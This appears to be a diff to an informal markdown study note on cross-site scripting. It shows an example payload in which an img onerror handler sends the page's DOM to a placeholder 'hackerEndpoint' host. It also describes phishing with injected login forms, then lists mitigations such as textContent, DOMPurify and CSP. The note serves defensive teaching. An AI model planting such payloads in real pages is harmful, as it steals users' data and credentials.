@@ -183,3 +183,35 @@ Passing in Query Params:
 <img src="empty.gif" onerror="var mycookie=document.cookie; new Image().src=`http://hackerEndpoint/fpage.php?output=${document.body.innerHTML}`;">
 ```
 This can just able to copy paste every single information from your DOM and send it to the hacker. same as the phishing attack. hacker will inject the user form, suppose a login form so he'll just take you to the fake login form and you'll put the information and malicious script will send your credentials to the hacker and you'll be fucked up.
+
+
+You can also pass or execute a cool looking form and when user put his credentials just take dom snapshot and pass it to out hacking server or just take critical information to hack the user. 
+
+**Mitigations or things to be care of:**
+<hr>
+
+1. List all possible ways to take user inputs. (In form of URL or Mobile number or email like wise).
+2. Please do not user innerHtml kind of things, user textContent or innerText. So it won't be execute as a DOM element.
+3. Use Escaping. Like escaping script tag or sanitise those tags (possible threats) to some other random strings.
+4. Use any lib like React or angular that will take care of all thease things.
+5. Do not put Dangerous HTML;s in your DOM.
+6. Use libs like DOM purify. it will sanitise the data.
+7. Use CSP headers. It control like from which sources and what form of resources can be loaded. It will be conveyed by your server to your browers by csp headers maybe. (But confirm once!!!).
+
+
+Lets Brief about CSP.
+
+**CSP: (Content security policy)**
+
+Allowed Sources:
+You can tell the allowed resources: Whar are allowed sources of script, images, Iframe or forms. So this can be decided by allowed source. (Either cross or same origin).
+
+Script Nounces:
+Way to differentiate the script is yours or injected by someone else.
+
+Report-only Mode:
+To track the Xss attacks.
+
+
+**Try to setup the Small Node Server:**
+
